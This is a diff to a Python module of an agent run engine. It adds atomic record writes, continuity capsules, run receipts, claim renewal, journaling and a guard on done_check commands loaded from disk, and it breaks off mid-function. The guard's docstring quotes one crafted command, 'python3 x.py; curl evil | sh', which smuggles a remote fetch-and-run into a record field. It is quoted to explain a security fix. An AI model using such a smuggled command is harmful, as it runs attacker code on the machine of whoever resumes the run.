@@ -83,9 +83,12 @@ path as a suggested next command for a human to run by hand
 PRODUCER: this module is the producer of the two files it writes
 directly. _write_run_target() (lines 153-159) writes target.json via a
 plain open(...,"w") plus json.dump({"cwd": ...}), called once at run
-start. _mark_integrated() (lines 307-324) rewrites the run's own Work
-document in place (open(record_path,"w") plus json.dump(doc,...), lines
-322-323), marking each unit DONE after real integration. The Work
+start. _mark_integrated() rewrites the run's own Work document in place,
+marking each unit DONE after real integration. Since E61 that rewrite, and
+the nine other stamps beside it, no longer truncate the real file: every
+one calls work_record.write_record(record_path, doc), which writes a temp
+file beside the target, fsyncs it and os.replace()s it under the claim
+store's lock, so a run killed mid-stamp leaves a whole document. The Work
 document is first CREATED by a separate module, door.py, invoked as a
 subprocess in run_door() (lines 116-139) and read back there (lines
 136-137); this module only updates that document's status fields
@@ -101,25 +104,38 @@ import hashlib
 import io
 import json
 import os
+import re
 import shutil
 import subprocess
 import sys
 import tempfile
+import uuid
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 REPO_ROOT = os.path.dirname(HERE)
 sys.path.insert(0, HERE)
+import claim_store  # noqa: E402
 import decide  # noqa: E402
 import door  # noqa: E402
 import integrate  # noqa: E402
+import journal  # noqa: E402
 import loom  # noqa: E402
 import loop_bridge  # noqa: E402
 import receipt_door  # noqa: E402
+import run_heartbeat  # noqa: E402
+import work_record  # noqa: E402
 
 NODATA = "NO-DATA"
 DOOR = os.path.join(HERE, "door.py")
 TARGET_FILENAME = "target.json"
 CLAIMS_FILENAME = "claims.json"
+#: E73.2's continuity capsule (scripts/continuity.py), written beside the
+#: journal at each lifecycle checkpoint. The literal is duplicated here
+#: rather than imported from continuity.py (which itself imports this
+#: module) so ENGINE_JSON_FILES, below, can be a plain module-level constant
+#: with no import-order cycle; continuity.CAPSULE_FILENAME names the same
+#: string.
+CAPSULE_FILENAME = "capsule.json"
 #: Everything the engine says to itself, verbatim, under the run's own
 #: directory. Deliberately NOT a .json name: _find_work_doc() picks the Work
 #: document as "the one .json that is neither claims nor target", so a third
@@ -138,6 +154,23 @@ CONTINUE_BARE = "\0bare\0"
 #: rule stays correct: this is a directory, not a *.json file at run_dir's
 #: own level, so it never becomes a candidate Work document.
 ATTEMPTS_DIRNAME = "attempts"
+
+#: E81: THE RECEIPT A RUN LEAVES BEHIND, and the path this repository's own
+#: README documents. The codex EVAD trial of 2026-09-04 ran the README's toy
+#: delivery against the public v1.0.1 clone: two files were edited, the
+#: process ended, and a find over the tree for a receipt file returned
+#: nothing, because the delivery report went to stdout and nowhere else.
+#: receipt_door.receipt_record() already built the machine view of a run
+#: (E72.1) and nothing ever wrote it down; _write_receipt (below) does, and
+#: main() prints this path as its LAST stdout line so a caller that kept
+#: only the tail still holds the proof. A DIRECTORY under the run
+#: directory, for the same reason screens/ is one: _find_work_doc picks the
+#: Work document as "the one *.json that is neither claims nor target", so a
+#: receipt.json sitting at run_dir's own level would break --resume and
+#: --continue (and fault_lab.py keeps its own copy of that name list, which
+#: this way needs no edit at all).
+RECEIPT_DIRNAME = "receipt"
+RECEIPT_FILENAME = "receipt.json"
 
 #: How many outer claims (not in-lane repair sub-attempts, which loop_bridge
 #: already bounds itself via --max-attempts) a single unit may be given
@@ -324,7 +357,7 @@ def run_door(outcome, store, dry_run=False, cwd=None):
 #: that did could no longer be resumed: --resume, --continue and the
 #: unfinished-run discovery all read the document through this one test.
 ENGINE_JSON_FILES = frozenset((
-    CLAIMS_FILENAME, TARGET_FILENAME,
+    CLAIMS_FILENAME, TARGET_FILENAME, CAPSULE_FILENAME,
     os.path.basename(loop_bridge.usage_sidecar_path(CLAIMS_FILENAME))))
 
 
@@ -357,6 +390,75 @@ def _read_run_target(run_dir):
             return json.load(fh).get("cwd")
     except (OSError, ValueError):
         return None
+
+
+#: Where a finished run's own measured wall clock ends up: build_cost_block
+#: puts wall_clock_seconds in the cost block, build_report prints the block
+#: one field per line, and main() writes that whole report into the run log.
+#: So the figure below is READ BACK from the engine's own receipt, never
+#: re-derived from a directory timestamp, and a run that never finished (no
+#: report, no cost block) simply contributes nothing.
+_WALL_CLOCK_IN_LOG = re.compile(r"wall_clock_seconds:\s*([0-9]+(?:\.[0-9]+)?)")
+
+
+def previous_run_durations(runs_root, cwd, limit=3):
+    """The measured wall clock, in seconds, of the last `limit` finished runs
+    against `cwd`, newest first.
+
+    E46: the intent screen used to say only that how long a run takes is not
+    knowable in advance, which is honest and unhelpful in the same breath. It
+    is still not predictable, but what earlier runs against this same target
+    ACTUALLY took is measured and sitting on disk, and three real figures
+    tell a person more about the wait ahead than any estimate would.
+
+    Never guesses: a run with no target marker is not matched to this target,
+    a run with no log or no cost block in it contributes nothing, and an
+    unreadable log is skipped rather than raising."""
+    runs_dir = os.path.join(os.path.abspath(runs_root), "docs", "plan", "runs")
+    if not os.path.isdir(runs_dir):
+        return []
+    target = os.path.abspath(cwd)
+    out = []
+    try:
+        names = sorted(os.listdir(runs_dir), reverse=True)
+    except OSError:
+        return []
+    for name in names:
+        if len(out) >= limit:
+            break
+        run_dir = os.path.join(runs_dir, name)
+        if not os.path.isdir(run_dir):
+            continue
+        run_cwd = _read_run_target(run_dir)
+        if run_cwd is None or os.path.abspath(run_cwd) != target:
+            continue
+        try:
+            with open(os.path.join(run_dir, LOG_FILENAME),
+                      encoding="utf-8") as fh:
+                text = fh.read()
+        except OSError:  # sbe: allow-silent reader-only: a run whose log cannot be opened contributes no duration and the sentence below says how many were measurable
+            continue
+        found = _WALL_CLOCK_IN_LOG.findall(text)
+        if not found:
+            continue
+        try:
+            out.append(float(found[-1]))
+        except ValueError:  # sbe: allow-silent reader-only: a log line whose number will not parse contributes no duration, and nothing here rewrites the run
+            continue
+    return out
+
+
+def previous_runs_line(durations):
+    """One sentence naming what earlier runs against this target really took,
+    or "" when none of them is measurable. Separated from the reading above
+    so the wording is testable without a run directory."""
+    if not durations:
+        return ""
+    return ("The last %d run(s) against this target really took %s "
+            "(measured, newest first); this one is not predictable from "
+            "them, but it is the only evidence there is."
+            % (len(durations),
+               ", ".join("%ds" % int(round(d)) for d in durations)))
 
 
 def _is_unfinished(record):
@@ -422,6 +524,44 @@ def _outcomes_match(new_outcome, recorded_outcome):
     return a == b or a in b or b in a
 
 
+def _guard_record_checks(record):
+    """(refusals) for a Work document that came off DISK, one (unit_id,
+    reason) per done_check the door's own guard refuses; empty means every
+    check passed the fence.
+
+    THE HOLE THIS CLOSES (security review 2026-09-04, Critical): a unit's
+    done_check reaches _reexecute_check and _check_without with shell=True,
+    and door.guard_adopted_check used to stand only between a MODEL-REWRITTEN
+    replacement and that shell. A record is not this engine's own output on
+    three paths: --resume takes a run directory named on the command line,
+    --continue and the implicit resume find one by its recorded cwd, and any
+    of those directories can be a checkout a stranger shipped. So a crafted
+    record's `"done_check": "python3 x.py; curl evil | sh"` was arbitrary
+    shell the moment somebody resumed it.
+
+    The fence is the SAME one, not a second dialect: build_prompt already
+    asks the model for "a single shell command", so a record this engine
+    itself created passes unchanged, and a record that does not was never
+    written to the contract the door states.
+
+    The refusal reason names the rule broken and never the refused command,
+    per guard_adopted_check's own contract: echoing it back would put the
+    crafted string in front of the next reader."""
+    refusals = []
+    for row in record.get("rows") or record.get("units") or []:
+        command = str(row.get("done_check") or "").strip()
+        if not command:
+            # A row with no check at all is a different problem, already
+            # reported by the precheck stamp and the receipts as
+            # "no done_check was recorded for this unit". Silence here is
+            # not a pass: nothing is executed either way.
+            continue
+        allowed, reason = door.guard_adopted_check(command)
+        if not allowed:
+            refusals.append((str(row.get("id") or "(unnamed unit)"), reason))
+    return refusals
+
+
 def _source_tools_dir(repo_root=None, env=None):
     """The product's OWN worker adapter directory when this engine runs from
     a checkout that carries it (products/brothermode/tools beside scripts/),
@@ -452,6 +592,97 @@ def _source_tools_dir(repo_root=None, env=None):
         else None
 
 
+def _write_capsule(run_dir):
+    """E73.2's own hook, called beside every lifecycle journal.append site
+    below: writes this run's continuity capsule (scripts/continuity.py,
+    E73.1) to <run_dir>/capsule.json, so a killed run's resume screen has
+    something fresher than the raw journal to read.
+
+    IMPORTED LOCALLY, NOT AT MODULE TOP: continuity.py itself does
+    `import brother_run`, and this module already carries a long list of
+    top-level imports (claim_store, decide, door, integrate, journal, loom,
+    loop_bridge, receipt_door) that continuity.py does not need to see
+    while it defines its own functions. A local import here is resolved
+    the first time a checkpoint fires, by which point this module has
+    finished loading end to end, so the cycle that would bite a module-
+    level import never has a chance to.
+
+    AVAILABILITY OVER BOOKKEEPING, journal.append's own stance: a capsule
+    write failure must never stop the run being recorded. continuity.
+    write_capsule already prints its own stderr line; this also journals
+    the failure as its own event, so a degraded capsule leaves a permanent
+    trace beside the checkpoint it belongs to, not just a line that
+    scrolls off a terminal."""
+    import continuity
+    ok, problem = continuity.write_capsule(run_dir)
+    if not ok:
+        journal.append(run_dir, "capsule.write_failed",
+                       parent_ids=journal.previous(run_dir),
+                       payload={"reason": problem[:200]})
+
+
+def _write_receipt(run_dir, receipts, report, log_path=None):
+    """(path, "") or (None, why). E81: the run's own receipt, on disk, at
+    RECEIPT_DIRNAME/RECEIPT_FILENAME under `run_dir`.
+
+    NOT A SECOND RECEIPT WRITER. The content is exactly
+    receipt_door.receipt_record()'s eight-question machine view (E72.1), the
+    same function scripts/accept_delivery.py and the board already read a
+    run through; this only serializes it. The one field added is `report`,
+    the delivery report main() prints verbatim, so the file stands alone:
+    a reader who never saw stdout still reads what ran, which is the whole
+    complaint the codex trial recorded ("files changed and nothing that
+    says by whom or with what proof").
+
+    Unlike the capsule and the screens beside it, a failure here is NOT
+    swallowed. A run that wrote files and cannot leave a receipt has
+    nothing to show for itself, and main() turns this `why` into a nonzero
+    exit rather than a silent zero."""
+    if not run_dir:
+        return None, "no run directory: this run never opened one"
+    out_dir = os.path.join(run_dir, RECEIPT_DIRNAME)
+    path = os.path.join(out_dir, RECEIPT_FILENAME)
+    try:
+        # run_dir, not the in-memory record: receipt_record reads the Work
+        # document, the journal and the capsule from there, so Q5 (repair
+        # history) and Q8 (continuity) carry real answers rather than the
+        # empty ones a bare dict leaves behind. main() has already written
+        # every integration and refusal back to that document by now.
+        body = receipt_door.receipt_record(run_dir, receipts, log_path)
+        body["report"] = report
+        os.makedirs(out_dir, exist_ok=True)
+        with open(path, "w", encoding="utf-8") as fh:
+            json.dump(body, fh, indent=1, default=str)
+    except (OSError, ValueError, TypeError, KeyError, AttributeError) as exc:
+        return None, "%s could not be written: %s" % (path, exc)
+    return path, ""
+
+
+def _print_resume_screen(run_dir, outcome):
+    """--continue's own first words (E73.2): the capsule's resume screen
+    when this run wrote one, read straight off disk rather than rebuilt (so
+    what a person sees is exactly what the engine last checkpointed, never
+    a fresh snapshot that could disagree with it); NO-DATA naming the
+    outcome when it did not (a run from before E73.1/E73.2 landed, or one
+    whose only capsule write ever attempted failed)."""
+    path = os.path.join(run_dir, CAPSULE_FILENAME)
+    if not os.path.isfile(path):
+        print("brother_run: %s: %r recorded no continuity capsule; "
+              "resuming from the journal and the stores alone"
+              % (NODATA, outcome))
+        return
+    try:
+        with open(path, encoding="utf-8") as fh:
+            cap = json.load(fh)
+    except (OSError, ValueError) as exc:
+        print("brother_run: %s: the continuity capsule for %r could not "
+              "be read (%s); resuming from the journal and the stores "
+              "alone" % (NODATA, outcome, exc))
+        return
+    import continuity
+    continuity._print_screen(cap)
+
+
 def run_loop(plan_path, claims_path, cwd, slots):
     """loop_bridge.main(), in-process, worker left at ITS OWN default
     (model_worker.py, since P0.2 landed there). Returns (code, text).
@@ -460,18 +691,69 @@ def run_loop(plan_path, claims_path, cwd, slots):
     every test that stands in for this function uses this exact four-argument
     signature, and the same _source_tools_dir() answer main() reads for the
     intent screen is the one loop_bridge is handed, so the bound a person
-    sees and the bound the worker gets come from one loaded module."""
+    sees and the bound the worker gets come from one loaded module.
+
+    E46 IS DELIBERATELY NOT WIRED HERE, and the reason is worth keeping: the
+    heartbeat that narrates this wait is started by main() around the WHOLE
+    round loop, not by this function around one round. Two reasons, and the
+    second one is the one that was learned the hard way. It covers more: the
+    silence a person complained about spans every round, and a heartbeat
+    scoped to one round goes quiet in the gaps between them. And this
+    signature is load-bearing: every test that stands in for run_loop
+    declares exactly these four arguments, so giving it two more (even
+    optional ones that main() then passes) breaks nine stubs at once. It did,
+    and this comment is why it will not again.
+
+    E62: loop_bridge.main() is ONE BLOCKING CALL that claims a batch and
+    waits on every worker in it. This is brother_run's own wait on a running
+    worker, and until now nothing renewed the claims it is waiting on: a
+    unit whose worker outlived claim_store.DEFAULT_TTL_SECONDS had its lease
+    expire under it, and the next reconcile read a still-live owner as
+    abandoned. A background renewal (claim_store.BackgroundRenewal) now
+    guards this exact wait, started right before it and stopped right
+    after, renewing every claim this owner holds at half the lease length
+    for as long as the call is in flight. A renewal failure stops the
+    renewal loop rather than silently retrying, and is folded into this
+    round's own text below so it reaches the run log the same way every
+    other word loop_bridge says already does (see the round loop's
+    log.note(loop_text...) in main())."""
+    owner = "brother-run-%d" % os.getpid()
     args = ["--plan", plan_path, "--claims", claims_path, "--cwd", cwd,
-            "--owner", "brother-run-%d" % os.getpid()]
+            "--owner", owner]
     if slots is not None:
         args += ["--slots", str(slots)]
     tools_dir = _source_tools_dir()
     if tools_dir:
         args += ["--tools", tools_dir]
+    # E59, THE ROUND'S OWN EVENT, written BEFORE the round runs rather than
+    # after it: a round whose loop_bridge never returns (a hung worker, a
+    # killed process) still leaves the record that it was dispatched, which
+    # is the one fact a crash otherwise erases. The plan lives in the run
+    # directory, so the journal is one dirname away and no caller had to be
+    # changed to carry it.
+    run_dir = os.path.dirname(os.path.abspath(plan_path))
+    journal.append(run_dir, "dispatch.round",
+                   parent_ids=journal.previous(run_dir),
+                   payload={"slots": slots, "own_tools": bool(tools_dir)})
+    _write_capsule(run_dir)
     out, err = io.StringIO(), io.StringIO()
-    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
-        code = loop_bridge.main(args)
-    return code, out.getvalue() + err.getvalue()
+    renewal = claim_store.BackgroundRenewal(claims_path, owner).start()
+    try:
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            code = loop_bridge.main(args)
+    finally:
+        failures = renewal.stop()
+    text = out.getvalue() + err.getvalue()
+    if failures:
+        # THE ESTATE'S REFUSAL SHAPE, the same one this file's other
+        # refusals use: named unit, one line, never silent. This is folded
+        # into the round's own text (not printed separately) so it lands in
+        # the run log exactly where every other loop_bridge word already
+        # does, with no second logging path to keep in sync.
+        text += "".join(
+            "NO-DATA: claim renewal failed for %s: %s\n"
+            % (unit_id or "(store)", why) for unit_id, why in failures)
+    return code, text
 
 
 def _head(cwd):
@@ -606,6 +888,14 @@ def _write_attempt_trace(run_dir, uid, attempt, claim, loop_text, tree_state):
         with open(os.path.join(attempt_dir, "tree_state.txt"), "w",
                  encoding="utf-8") as fh:
             fh.write(tree_state)
+        # E59: the journal points AT the trace it just wrote rather than
+        # copying any of it; the three files above are where a reader goes
+        # for the output, and this is the event that says they exist.
+        journal.append(run_dir, "attempt.traced",
+                       parent_ids=journal.previous(run_dir), unit_id=uid,
+                       payload={"attempt": attempt,
+                                "claim_state": str((claim or {}).get("state")
+                                                   or NODATA)})
     except OSError as exc:
         print("brother_run: could not write the attempt trace for %s "
               "attempt %d to %s (%s); the run continues without it"
@@ -960,8 +1250,63 @@ def validate_cost_block(block):
     return not missing, missing
 
 
+#: The lock files env_lock checks, in this fixed order (P9, persona
+#: integration plan 2026-09-04 row P9; doc 12.6 code, environment and model
+#: identity): the first one found in the target names the environment. Order
+#: follows the row's own words verbatim.
+ENV_LOCK_FILENAMES = ("requirements.txt", "uv.lock", "poetry.lock",
+                      "environment.yml")
+
+
+def _env_lock(cwd):
+    """sha256 hex digest of the first of ENV_LOCK_FILENAMES that exists in
+    the target `cwd`, checked in that fixed order; NO-DATA naming that none
+    of the four exist when none do, or that no target directory was even
+    given. A file that IS found but cannot be read gets its own NO-DATA
+    reason, never a swallowed exception standing in for a hash nobody
+    computed."""
+    if not cwd:
+        return "%s: no target directory was given" % NODATA
+    for name in ENV_LOCK_FILENAMES:
+        path = os.path.join(cwd, name)
+        if not os.path.isfile(path):
+            continue
+        try:
+            with open(path, "rb") as fh:
+                return hashlib.sha256(fh.read()).hexdigest()
+        except OSError as exc:
+            return "%s: %s could not be read (%s)" % (NODATA, name, exc)
+    return ("%s: none of %s exist in the target"
+           % (NODATA, ", ".join(ENV_LOCK_FILENAMES)))
+
+
+def _data_identity_for_row(row, cwd):
+    """{declared path: sha256 hex or its own NO-DATA reason} for every path
+    a unit declares under `data_inputs` (P9, doc 12.6), resolved against the
+    target `cwd`. NO-DATA naming that the unit declares no data_inputs at
+    all when the field is empty or absent, never an empty dict standing in
+    for "nothing was asked for". A declared path that does not exist or
+    cannot be read gets its own NO-DATA reason, per path, so one bad path
+    never hides the hashes of the others."""
+    declared = row.get("data_inputs") or []
+    if not declared:
+        return "%s: this unit declares no data_inputs" % NODATA
+    out = {}
+    for rel in declared:
+        path = rel if os.path.isabs(rel) else os.path.join(cwd or "", rel)
+        if not os.path.isfile(path):
+            out[rel] = "%s: %s does not exist in the target" % (NODATA, rel)
+            continue
+        try:
+            with open(path, "rb") as fh:
+                out[rel] = hashlib.sha256(fh.read()).hexdigest()
+        except OSError as exc:
+            out[rel] = "%s: %s could not be read (%s)" % (NODATA, rel, exc)
+    return out
+
+
 def build_report(record, claims, before, after, changed=None,
-                 log_path=None, loop_text="", cost_block=None):
+                 log_path=None, loop_text="", cost_block=None, cwd=None):
     """The delivery report: what happened, named, never inferred from a
     worker's own claim. `record` is the canonical Work document door wrote.
 
@@ -976,7 +1321,18 @@ def build_report(record, claims, before, after, changed=None,
     COST_FIELDS order, so the eight required fields are always readable in
     the same place a person already reads the rest of the record; omitted
     (None) leaves the existing callers of this function, which predate the
-    cost block, byte-for-byte unchanged."""
+    cost block, byte-for-byte unchanged.
+
+    `cwd` (P9, persona integration plan 2026-09-04 row P9; doc 12.6 code,
+    environment and model identity; doc F14 reproducibility failure): the
+    target's own directory, never this tool's checkout, read once here for
+    env_lock (_env_lock) and per-row data_identity (_data_identity_for_row)
+    and handed to receipt_door.receipts_for so every receipt prints the
+    target's revision, its environment lock hash and its declared data
+    hashes beside the harness revision it already carried. target_revision
+    is simply `after`, already this target's own HEAD read post-integration;
+    omitted (None, every caller that predates this row) reads NO-DATA on
+    env_lock and data_identity, never a made-up hash."""
     rows = {r["id"]: r for r in record.get("rows", [])}
     integrated, refused = [], []
     for uid in rows:
@@ -1092,7 +1448,25 @@ def build_report(record, claims, before, after, changed=None,
     # Nothing here is invented: every command, exit code and refusal reason
     # comes from the claim store's own evidence or from the refusal list
     # this same function just built.
-    receipts = receipt_door.receipts_for(record, claims, refused, log_path)
+    #
+    # P9 (doc 12.6): target_revision, env_lock and per-unit data_identity,
+    # computed once from `cwd` (this call's own docstring above), handed to
+    # receipts_for so every receipt below carries them beside harness_revision.
+    target_revision = after or NODATA
+    env_lock = _env_lock(cwd)
+    data_identity_by_id = {uid: _data_identity_for_row(rows.get(uid) or {}, cwd)
+                           for uid in rows}
+    receipts = receipt_door.receipts_for(
+        record, claims, refused, log_path, target_revision=target_revision,
+        env_lock=env_lock, data_identity_by_id=data_identity_by_id)
+    # P12: the loop closes here, right beside the receipts it reads. One
+    # recurrence receipt per unit (bm_recurrence.record_receipt) and, for
+    # every unit that did not PASS, a drafted lesson file under this run's
+    # own directory, never in the vault itself. See the function's own
+    # docstring for why this is safe against build_report's two-pass call
+    # in main() and for what "no run directory" does (nothing, honestly).
+    _record_recurrence_and_draft_lessons(record, receipts,
+                                         journal.run_dir_from_env())
     lines.append("")
     lines.append("  what this run proved, one line per piece of work:")
     verdict_counts = {"PASS": 0, "FAIL": 0, "NO-DATA": 0}
@@ -1115,6 +1489,27 @@ def build_report(record, claims, before, after, changed=None,
         verdict_counts[verdict] += 1
         lines.append("    " + receipt_door.receipt_sentence(receipt)
                      + resumed_note + " verdict: %s" % verdict)
+    # P5 (persona integration, gap P5): the profession-aware question's own
+    # line on the receipt, the record's `human_decision` repeated verbatim
+    # when a live person answered it, or an explicit NO-DATA line naming
+    # the metric that was never asked (unattended mode's own budget: zero
+    # questions) or never answered (the stream closed before one arrived).
+    # Neither field is ever present unless door.py's own compute_challenge
+    # decided a question was warranted, so a plain run's report carries
+    # neither line, unchanged from before this row.
+    human_decision = record.get("human_decision")
+    pending_challenge = record.get("pending_challenge")
+    if human_decision:
+        lines.append("  human decision (%s): %s -> %s"
+                     % (human_decision.get("lens") or NODATA,
+                        human_decision.get("question") or NODATA,
+                        human_decision.get("answer") or NODATA))
+    elif pending_challenge:
+        lines.append("  human decision (%s): %s; %s never answered "
+                     "(zero questions in unattended mode; run "
+                     "--interactive to answer it)"
+                     % (pending_challenge.get("lens") or NODATA, NODATA,
+                        pending_challenge.get("question") or NODATA))
     lines.append("")
     lines.append("  " + receipt_door.SCOPING_SENTENCE)
     if cost_block is not None:
@@ -1139,6 +1534,199 @@ def _verdict_for(receipt):
     NO-DATA, and NO-DATA is never reported as a pass."""
     return {"verified": "PASS", "refused": "FAIL"}.get(
         receipt.get("state"), "NO-DATA")
+
+
+#: P12 (persona plan row P12, 2026-09-04): the journal event types the
+#: recurrence loop reads and writes, named once so a reader can grep the
+#: whole chain by string. VAULT_RECALL is not written by anything in this
+#: file: it is the extension point a future recall hook or worker journals
+#: onto, {"records": [{"slug","path","state","line"}, ...]} per event, the
+#: exact shape products/brothermode/tools/vault_recall_hook.lesson_states
+#: already produces. Nothing writing it yet is not a bug here: an empty
+#: `recalled` list reads honestly as "nothing surfaced for this unit",
+#: never as a fabricated one.
+VAULT_RECALL_EVENT_TYPE = "vault.recall"
+RECURRENCE_RECORDED_EVENT_TYPE = "recurrence.receipt_recorded"
+RECURRENCE_FAILED_EVENT_TYPE = "recurrence.receipt_failed"
+LESSON_DRAFTED_EVENT_TYPE = "lesson.drafted"
+LESSON_DRAFT_FAILED_EVENT_TYPE = "lesson.draft_failed"
+LESSONS_DIRNAME = "lessons"
+
+#: bm_recurrence.py loaded by path once and cached, the same technique
+#: bm_playbook.py already uses to reach the same module: it ships as a
+#: plugin tool under products/brothermode/tools, never as an installed
+#: package, so there is nothing on sys.path to `import bm_recurrence`
+#: normally. None means "could not load it", read at every call site as a
+#: reason to skip, never to crash a delivery report over.
+_BM_RECURRENCE_MODULE = None
+
+
+def _load_bm_recurrence():
+    global _BM_RECURRENCE_MODULE
+    if _BM_RECURRENCE_MODULE is not None:
+        return _BM_RECURRENCE_MODULE
+    path = os.path.join(REPO_ROOT, "products", "brothermode", "tools",
+                        "bm_recurrence.py")
+    if not os.path.isfile(path):
+        return None
+    try:
+        import importlib.util
+        spec = importlib.util.spec_from_file_location("bm_recurrence", path)
+        mod = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(mod)
+    except Exception:  # sbe: allow-silent a broken recurrence module must never break a delivery report; the caller reads None as "skip"
+        return None
+    _BM_RECURRENCE_MODULE = mod
+    return mod
+
+
+def _recalled_records_for_unit(events, uid):
+    """Every {"slug","path","state","line"} dict any VAULT_RECALL_EVENT_TYPE
+    journal event for this unit carried, in event order, flattened across
+    however many such events exist. `events` is journal.read()'s own list,
+    read once by the caller; nothing here re-reads the file. No matching
+    event reads as [], honestly: nothing was recalled for this unit, never
+    a guess."""
+    out = []
+    for event in events or ():
+        if event.get("type") != VAULT_RECALL_EVENT_TYPE:
+            continue
+        if event.get("unit_id") != uid:
+            continue
+        out.extend((event.get("payload") or {}).get("records") or [])
+    return out
+
+
+def _existing_event_id(events, event_type, uid):
+    """The event_id of an event of `event_type` already on this unit's
+    chain, or None. Read before writing a new one of the same type: main()
+    calls build_report twice per run by design (a first pass to compute
+    `refused` for the cost block, then the real pass), and this is what
+    keeps a second pass from recording the same receipt twice or drafting
+    the same lesson file twice."""
+    for event in events or ():
+        if event.get("type") == event_type and event.get("unit_id") == uid:
+            return event.get("event_id")
+    return None
+
+
+def _lesson_note_text(uid, receipt, run_id):
+    """A vault-shaped failure note for a refused or NO-DATA unit, honest
+    about where it came from: source_receipt names the run, human_approved
+    is always false because nobody has reviewed it yet. Satisfies
+    bm_vault_lint.py's own contract field for field: BASE_REQUIRED (id,
+    type, status, created) plus EXTRA_REQUIRED_BY_TYPE["failure"] =
+    ("symptom",). id is minted the same shape bm_vault_ids.mint() produces
+    (n- plus 16 hex characters) without importing that module for one
+    line."""
+    reason = str(receipt.get("reason") or "").strip()
+    symptom = (reason or ("unit %r produced no verifiable evidence "
+                          "(NO-DATA receipt)" % uid)).replace("\n", " ")[:400]
+    lines = [
+        "---",
+        "id: n-%s" % uuid.uuid4().hex[:16],
+        "type: failure",
+        "status: open",
+        "created: %s" % datetime.date.today().isoformat(),
+        "source_receipt: %s" % run_id,
+        "human_approved: false",
+        "symptom: %s" % symptom,
+        "---",
+        "",
+        "# %s: %s" % (uid, str(receipt.get("objective") or "").strip() or NODATA),
+        "",
+        "Drafted automatically by brother_run.py from a refused or NO-DATA "
+        "receipt (P12, the recurrence loop). Nobody has reviewed this: it "
+        "stays out of the vault and human_approved stays false until a "
+        "person promotes it.",
+        "",
+        "- unit: %s" % uid,
+        "- verdict: %s" % _verdict_for(receipt),
+        "- command: %s" % (receipt.get("command") or NODATA),
+        "- reason: %s" % (reason or NODATA),
+        "- run: %s" % run_id,
+        "",
+    ]
+    return "\n".join(lines)
+
+
+def _record_recurrence_and_draft_lessons(record, receipts, run_dir):
+    """P12: one recurrence receipt per unit (bm_recurrence.record_receipt),
+    surfaced/applied read off this unit's own VAULT_RECALL_EVENT_TYPE
+    journal events via receipt_door.applied_memory (E74's own partition,
+    never recomputed here), before_first_write always True because a
+    PreToolUse-shaped recall structurally happens before the write it
+    precedes. Then, for every unit whose receipt did not read PASS, a
+    drafted lesson file under <run_dir>/lessons/, never in the real vault.
+
+    BEST EFFORT AND IDEMPOTENT, not merely best effort: `events` is read
+    once and both writers below check it for an event they already wrote
+    before writing another, which is what makes this safe against
+    build_report's own two-pass call in main() (see that function's
+    comment) without needing a lock. A missing run directory writes
+    nothing at all: journal.py's own rule, "no run directory is not a
+    failure", a receipt about a run needs a run to sit beside."""
+    if not run_dir:
+        return
+    events = journal.read(run_dir) or []
+    run_id = os.path.basename(os.path.normpath(run_dir))
+    bm_recurrence = _load_bm_recurrence()
+    for receipt in receipts:
+        uid = receipt.get("id")
+        if not uid:
+            continue
+        recurrence_event_id = _existing_event_id(
+            events, RECURRENCE_RECORDED_EVENT_TYPE, uid)
+        if recurrence_event_id is None and bm_recurrence is not None:
+            recalled = _recalled_records_for_unit(events, uid)
+            section = receipt_door.applied_memory(recalled)
+            surfaced = sorted({entry.get("slug") for values in section.values()
+                               for entry in values if entry.get("slug")})
+            applied = sorted({entry.get("slug")
+                              for entry in section.get("applied", [])
+                              if entry.get("slug")})
+            try:
+                bm_recurrence.record_receipt(
+                    "%s:%s" % (run_id, uid), surfaced, applied, [], "",
+                    True, db_path=None)
+            except Exception as exc:  # a receipt store failure (a locked or full db, a bad contract call) must never stop the run being reported
+                journal.append(run_dir, RECURRENCE_FAILED_EVENT_TYPE,
+                               parent_ids=journal.previous(run_dir),
+                               unit_id=uid,
+                               payload={"error": str(exc)[:200]})
+            else:
+                recurrence_event_id = journal.append(
+                    run_dir, RECURRENCE_RECORDED_EVENT_TYPE,
+                    parent_ids=journal.previous(run_dir), unit_id=uid,
+                    payload={"surfaced": len(surfaced), "applied": len(applied)})
+                if recurrence_event_id:
+                    events.append({"type": RECURRENCE_RECORDED_EVENT_TYPE,
+                                   "unit_id": uid,
+                                   "event_id": recurrence_event_id})
+        if _verdict_for(receipt) == "PASS":
+            continue
+        if _existing_event_id(events, LESSON_DRAFTED_EVENT_TYPE, uid):
+            continue
+        lessons_dir = os.path.join(run_dir, LESSONS_DIRNAME)
+        path = os.path.join(lessons_dir, _safe_uid_segment(uid) + ".md")
+        if os.path.isfile(path):
+            continue
+        try:
+            os.makedirs(lessons_dir, exist_ok=True)
+            with open(path, "w", encoding="utf-8") as fh:
+                fh.write(_lesson_note_text(uid, receipt, run_id))
+        except OSError as exc:
+            journal.append(run_dir, LESSON_DRAFT_FAILED_EVENT_TYPE,
+                           parent_ids=journal.previous(run_dir), unit_id=uid,
+                           payload={"error": str(exc)[:200]})
+            continue
+        journal.append(
+            run_dir, LESSON_DRAFTED_EVENT_TYPE,
+            parent_ids=([recurrence_event_id] if recurrence_event_id
+                       else journal.previous(run_dir)),
+            unit_id=uid,
+            payload={"path": os.path.relpath(path, run_dir),
+                    "verdict": _verdict_for(receipt)})
 
 
 def _exit_code_for(receipts, refused):
@@ -1308,52 +1896,109 @@ def _check_passes_now(command, cwd, runner=None, capture=None):
     return passed, proc.returncode, looks_broken, None
 
 
+#: P6 (doc E18/12.6): the five fields an evidence_family E18 unit's own
+#: check must write to <run_dir>/evidence/<unit_id>.json before
+#: _verify_evidence re-executes it. What was measured, its value, what it
+#: beat, the random seed and which holdout set decided it; a number with
+#: no seed or no holdout identity is not reproducible, so it is not
+#: evidence, whatever the check's exit code says.
+E18_FIELDS = ("metric", "value", "baseline", "seed", "holdout_id")
+
+
+def _read_e18_evidence(run_dir, unit_id):
+    """{field: value, ...} when <run_dir>/evidence/<unit_id>.json exists,
+    parses as a JSON object and carries every one of E18_FIELDS non-empty;
+    otherwise {"missing_reason": "no metric recorded: ..."} naming exactly
+    why not (no file, unreadable, not JSON, not an object, or one named
+    field absent). Never raises: a malformed evidence file is a fact about
+    this unit's proof, not a crash that would abort the whole run."""
+    path = os.path.join(run_dir or "", "evidence", "%s.json" % unit_id)
+    if not run_dir or not os.path.isfile(path):
